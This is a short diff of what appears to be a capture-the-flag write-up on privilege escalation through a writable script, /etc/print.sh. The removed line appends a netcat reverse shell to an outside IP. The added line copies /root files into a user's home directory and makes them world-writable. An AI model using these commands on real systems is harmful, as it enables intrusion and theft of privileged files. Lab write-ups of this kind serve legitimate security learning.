@@ -188,7 +188,8 @@ it also run a file with lennie permission
 ![image](https://user-images.githubusercontent.com/90561566/202415242-39b20879-3392-446a-a212-7e1e929e9b92.png)
 
 ```
-echo "nc 10.8.0.74 4444 -e /bin/sh" >> /etc/print.sh
+echo "cp /root/* /home/lennie/*;chmod 777 /home/lennie/*" >> /etc/print.sh
+
 ```
 
 
